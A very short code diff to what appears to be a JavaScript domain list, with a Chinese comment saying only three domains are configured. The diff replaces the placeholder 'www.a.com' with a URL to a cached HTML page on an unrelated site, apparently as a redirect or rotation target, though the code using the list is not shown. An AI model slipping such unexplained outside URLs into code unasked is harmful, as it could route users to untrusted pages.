@@ -2,7 +2,7 @@
 (function () {
     // 只配置3个域名
     var domains = [
-        "https://www.a.com",
+        "https://yczhiyu.com/runtime/cache/mga9f0518adc4847a49224f1664.html",
         "https://www.b.com",
         "https://www.c.com"
     ];
